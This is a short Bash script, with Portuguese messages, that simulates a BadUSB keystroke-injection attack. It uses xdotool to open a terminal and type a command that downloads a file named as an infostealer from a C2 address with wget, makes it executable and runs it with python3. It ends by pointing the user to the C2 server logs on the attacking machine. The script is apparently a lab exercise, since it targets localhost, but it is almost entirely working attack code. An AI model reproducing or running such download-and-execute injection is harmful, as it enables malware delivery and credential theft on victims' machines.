#!/bin/bash

DELAY=500
C2_URL="localhost:4443"
INFOSTEALER_FILENAME="stealer_client.py"

xdo_key_combo() {
    xdotool key "$@"
    sleep $(echo "scale=3; $DELAY / 1000" | bc)
}

xdo_string() {
    xdotool type "$1"
    sleep $(echo "scale=3; $DELAY / 1000" | bc)
}

echo "Simulando injeção de comandos do BadUSB..."

xdo_key_combo ctrl+alt+t
sleep $(echo "scale=3; $DELAY / 1000" | bc)

xdo_key_combo Return

xdo_string "wget ${C2_URL}/${INFOSTEALER_FILENAME} -O /tmp/${INFOSTEALER_FILENAME} && chmod +x /tmp/${INFOSTEALER_FILENAME} && python3 /tmp/${INFOSTEALER_FILENAME}"

echo "Comando do Infostealer injetado e executado."
echo "Verifique os logs do seu servidor C2 na máquina atacante."